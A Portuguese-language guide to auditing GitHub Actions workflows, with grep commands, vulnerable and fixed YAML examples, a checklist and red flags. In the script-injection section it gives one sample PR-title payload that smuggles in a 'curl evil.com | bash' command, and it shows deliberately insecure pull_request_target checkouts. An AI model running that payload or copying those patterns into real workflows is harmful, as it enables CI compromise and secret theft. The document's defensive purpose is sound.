# GitHub Actions — Segurança

GitHub Actions tem vulnerabilidades específicas que podem comprometer o repositório inteiro.

---

## Vulnerabilidades Críticas

### 1. pull_request_target com Checkout de Branch Externa
**Severidade: Critical**

`pull_request_target` roda no contexto do repositório base (com acesso a secrets). Se fizer checkout do código do PR, código malicioso tem acesso a secrets.

```bash
grep -rn "pull_request_target" --include="*.yml" .github/ -n
```

**Vulnerável:**
```yaml
on:
  pull_request_target:
    types: [opened]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # CRÍTICO — código do PR
      - run: npm ci && npm build  # código do atacante roda com acesso a secrets
```

**Seguro:**
```yaml
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4  # sem ref = checkout do base, não do PR
```

---

### 2. Injeção de Script via Variáveis de Contexto
**Severidade: High**

```bash
grep -rn "\${{ github.event.pull_request.title\|\${{ github.event.issue.title\|\${{ github.head_ref" --include="*.yml" .github/ -n | grep "run:"
```

**Vulnerável:**
```yaml
- run: echo "PR title: ${{ github.event.pull_request.title }}"
# Payload no título do PR: "; curl evil.com | bash #"
```

**Seguro:**
```yaml
- name: Process PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}  # como env var
  run: echo "PR title: $PR_TITLE"  # shell não interpreta como comando
```

---

### 3. Actions de Terceiros sem Versão Fixa
**Severidade: High**

```bash
grep -rn "uses:.*@main\|uses:.*@master\|uses:.*@latest" --include="*.yml" .github/ -n
```

**Vulnerável:**
```yaml
- uses: some-org/some-action@main  # pode mudar a qualquer momento
```

**Seguro:**
```yaml
- uses: some-org/some-action@v2.1.0  # versão fixada
# Melhor ainda: usar hash de commit
- uses: some-org/some-action@abc123def456...  # imutável
```

---

### 4. Secrets Expostos em Logs
**Severidade: High**

```bash
grep -rn "echo.*secrets\.\|print.*secrets\.\|console\.log.*secrets\." --include="*.yml" .github/ -n
```

**GitHub mascarará o valor do secret nos logs, mas é má prática e pode expor prefixos.**

---

### 5. Permissões Excessivas
**Severidade: Medium**

```bash
grep -rn "permissions:" --include="*.yml" .github/ -A 5 | grep "write-all\|write:"
cat .github/workflows/*.yml | grep -v "permissions:" | head -5  # sem declaração = permissões default
```

**Correto:**
```yaml
permissions:
  contents: read  # apenas o necessário
```

---

## Checklist

- [ ] `pull_request_target` não faz checkout de código do PR
- [ ] Variáveis de contexto usadas como env vars, não interpoladas em `run:`
- [ ] Actions de terceiros com hash de commit ou versão semântica fixa
- [ ] Secrets não ecoados em logs
- [ ] Permissões declaradas explicitamente (mínimas)
- [ ] Sem `--allow-unsafe-perm` ou `--force` em comandos npm
- [ ] Sem containers privilegiados em jobs de CI

---

## Red Flags

1. `pull_request_target` + `actions/checkout` com `ref: ${{ github.event.pull_request.head.sha }}`
2. `${{ github.event.pull_request.title }}` diretamente em `run:`
3. `uses: action@main` — sem versão fixa
4. `permissions: write-all` em workflow
5. Secrets de produção usados em workflows de PR (de forks)
